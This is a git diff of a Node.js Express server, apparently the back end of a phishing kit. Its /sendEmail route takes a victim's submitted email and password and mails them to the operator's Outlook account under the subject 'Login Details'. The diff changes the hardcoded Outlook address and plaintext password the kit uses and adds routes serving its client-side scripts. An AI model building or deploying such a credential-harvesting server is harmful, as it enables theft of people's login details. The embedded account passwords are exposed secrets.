@@ -21,14 +21,14 @@ app.post('/sendEmail', (req, res) => {
         port: 587,
         secure: false,
         auth: {
-            user: 'baileywalters212@outlook.com', // Replace with your Outlook email
-            pass: 'Lowercase$1' // Replace with your Outlook app password
+            user: 'ayomidesamod04@outlook.com', // Replace with your Outlook email
+            pass: '@_samod2005' // Replace with your Outlook app password
         }
     });
 
     let mailOptions = {
-        from: 'baileywalters212@outlook.com', // Replace with your Outlook email
-        to: 'baileywalters212@outlook.com', // Replace with your Outlook email
+        from: 'ayomidesamod04@outlook.com', // Replace with your Outlook email
+        to: 'ayomidesamod04@outlook.com', // Replace with your Outlook email
         subject: 'Login Details',
         text: `Client Email: ${email}\nClient Password: ${password}`
     };
@@ -47,3 +47,17 @@ app.post('/sendEmail', (req, res) => {
 app.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
 });
+
+app.use(express.static('public'));  
+
+// Example route to serve script.js
+app.get('/script.js', (req, res) => {
+    res.sendFile(__dirname + '/public/js/script.js');
+});
+
+// Example route to serve client.js
+app.get('/client.js', (req, res) => {
+    res.sendFile(__dirname + '/public/js/client.js');
+});
+
+// ... Rest of your server code
